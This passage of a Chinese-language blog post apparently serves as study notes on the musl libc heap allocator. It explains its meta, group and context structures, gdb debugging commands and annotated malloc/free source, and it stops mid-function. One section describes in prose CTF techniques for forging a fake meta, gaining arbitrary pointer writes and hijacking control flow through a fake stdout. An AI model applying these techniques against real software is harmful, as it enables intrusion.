class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">// 是个校验数字 保护meta_area 里的meta，防止meta被 伪造</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 指向下一个meta_area 如果没有 就默认为0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area 是管理<code>meta</code>的合集 <code>meta_area</code> 以页为单位分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> <span class="title">area</span> =</span> (<span class="type">void</span> )((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>)</span><br></pre></td></tr></table></figure><p>细节：</p><ul><li>在这个<code>meta_area</code>页被使用的时候，上一个临近的页会被设置为不可写是为了防止 使用者覆盖<code>check</code>校验值</li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context:"></a>__malloc_context:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>是<code>musl libc</code>记录结构状态的表，记录各个<code>meta</code> 和 <code>secret</code> 队列信息等</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><ul><li><code>musl</code> 中堆的管理由<code>meta</code> 管理 <code>group</code> ，<code>group</code> 管理 <code>chunk</code></li><li>在<code>free</code> 或者 <code>malloc chunk</code> 的时候又是从 <code>chunk</code> 到<code>group</code> 再到<code>meta</code> 从小到大索引</li><li><code>meta</code> 间通过<code>meta</code> 中<code>prev next</code> 结构形成循环链表连接</li></ul><h2 id="gdb调试技巧"><a href="#gdb调试技巧" class="headerlink" title="gdb调试技巧"></a>gdb调试技巧</h2><p>下载<code>xf1le</code>师傅的<code>gdb</code>插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git  </span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>可以查看<code>__malloc_context</code>的部分信息，可以详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/1.png" class="" title="我的图图呢">  <h3 id="p-malloc-context"><a href="#p-malloc-context" class="headerlink" title="p __malloc_context"></a>p __malloc_context</h3><p>可以查看<code>__malloc_context</code>的详细信息，但无法详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/2.png" class="" title="我的图图呢">  <h3 id="mmagic"><a href="#mmagic" class="headerlink" title="mmagic"></a>mmagic</h3><p>用于查看关键函数的地址</p><img src="/2024/01/17/musl/3.png" class="" title="我的图图呢">  <h3 id="p-struct-meta"><a href="#p-struct-meta" class="headerlink" title="p (struct meta)&lt;meta地址&gt;"></a>p <em>(struct meta</em>)&lt;meta地址&gt;</h3><p>查看某个<code>meta</code>结构体的详细信息</p><img src="/2024/01/17/musl/4.png" class="" title="我的图图呢">  <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这里直接贴上<code>0xRGz</code>师傅的文章</p><img src="/2024/01/17/musl/5.png" class="" title="我的图图呢">  <h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>这里一样直接贴上<code>0xRGz</code>师傅的文章<code>Orz</code><br>free流程：</p><ul><li>通过<code>get_meta(p)</code>得到<code>meta</code> (<code>get_meta</code> 是通过<code>chunk</code> 对应的<code>offset</code> 索引到对应的<code>group</code> 再索引到<code>meta</code>) 下面会详细介绍<code>get_meta</code></li><li>通过<code>get_slot_index(p)</code>得到对应<code>chunk</code>的 <code>idx</code> -&gt; 通过<code>get_nominal_size(p, end)</code> 算出真实大小</li><li>重置<code>idx</code> 和 <code>offset idx</code> 被置为<code>0xff</code> 标记<code>chunk</code></li><li>修改<code>freed_mask</code> 标记<code>chunk</code>被释放</li><li>最后调用<code>nontrivial_free</code> 完成关于<code>meta</code>一些剩余操作</li></ul><h2 id="pwn题常用技巧"><a href="#pwn题常用技巧" class="headerlink" title="pwn题常用技巧"></a>pwn题常用技巧</h2><p>一般有如下几种利用方法，核心原理都是构造假的<code>chunk</code> 索引到假的<code>group</code> 从而所引导假的<code>meta</code>或覆盖<code>group</code> 中指向<code>meta</code> 的指针 覆盖为假的<code>meta</code> ，然后使得假的<code>meta dequeue</code> 最终实现<code>unlink</code><br>(构造<code>fake_meta</code> 需要先泄露 <code>secret</code> 校验值)<br>1、伪造<code>meta</code> 后满足各种条件 使得其进入<code>dequeue</code> 通过<code>unlink</code>,构造<code>prev</code>,<code>next</code> 实现任意地址指针互写<br>通过任意地址互写指针，向<code>stdout_used</code> 写入我们伪造的<code>fake_stdout</code>地址， 通过<code>IO_FILE</code> 劫持程序执行流<br>到我们布置好的<code>fake_stdout</code> 上，可以找<code>IO_FILE</code> 里的一些函数<code>exit puts</code>在<code>fake_stdout</code>上布置<code>rop_chain</code>然后通过栈迁移的<code>gadget</code> 利用<code>FSOP</code> 劫持程序到布置的<code>fake_stdout</code>上<br>2、伪造<code>fake_meta</code> 也是任意地址指针互写，先进行布局使得 <code>fake_meta dequeue</code> 实现<code>unlink</code>，再利用指针互写 修改<code>fake_meta</code> 中的<code>mem</code>(<code>mem</code> 就是<code>group</code> 区域) ，把<code>mem</code> 修改为我们想要的地址，然后让<code>fake_meta</code> 通过<code>queue</code> 入队，可以实现任意地址分配的，然后同样是打 <code>IO_FILE</code> 通过修改<code>stdout stdin</code> 和<code>stderr</code> 结构体 劫持程序流</p><h2 id="补充：部分重要函数源码"><a href="#补充：部分重要函数源码" class="headerlink" title="补充：部分重要函数源码"></a>补充：部分重要函数源码</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 最大申请空间限制</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= 阈值 会直接通过mmap 申请空间</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//新mmap group 空间</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// 如果申请meta 失败 会把刚刚mmap 出来的group 回收</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// 回收group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group 地址</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group 头部 指向meta (g 为 meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmap的group last_idx默认值=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap 的申请的 sizeclass 都为63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap 内存记载数量++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则直接根据传入size，转换成size_classes的对应大小的 下标，</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果从ctx.active 中没找到对应的meta 会执行下面的if分支</span></span><br><span class="line"><span class="comment">    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// 如果在 ctx.active 没找到 就使用更大size group 的meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果当前group 不满足就会来到这里:</span></span><br><span class="line"><span class="comment">      alloc_slot 从group 中取出对应大小chunk 的idx</span></span><br><span class="line"><span class="comment">      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用</span></span><br><span class="line"><span class="comment">        再从队列中其他meta的group 中找</span></span><br><span class="line"><span class="comment">      如果队列中其他meta的group 有可利用的chunk,就使用</span></span><br><span class="line"><span class="comment">      如果没有就重新分配一个新的group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// 取出 sc 对应active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 从对应meta 中的group 取出 第idx号chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>!!! 关键: 一般分配先进入这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//这里只有mask=0时，first才会为0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//mask为0，first=0，无可用空闲chunk，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//如果是排它锁, 那么下面保证成功</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//成功找到并设置avail_mask之后,continue 后设置idx，然后跳出</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line">    如果</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>alloc_slot:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// 尝试从限制active 中找到合适可用的</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//把新meta 加入队列</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_avail:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk</span></span><br><span class="line"><span class="comment">        !!! free释放的chunk 不能马上被复用的 !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。</span></span><br><span class="line"><span class="comment">       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象</span></span><br><span class="line"><span class="comment">       若meta链表中没有，一般meta 的next和prev 都是指向自己</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，</span></span><br><span class="line">        <span class="comment">// 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// 如果这个meta 后还有meta 就切换到 下一个meta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// 页对齐</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// 这里是给 m的 avail_mask 打上标记</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="free-1"><a href="#free-1" class="headerlink" title="free:"></a>free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 通过chunk p 用get_meta得到对应的meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// 得到对应chunk的 idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// 得到sizeclasses 中对应chunk类型的size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//算出真实大小</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span 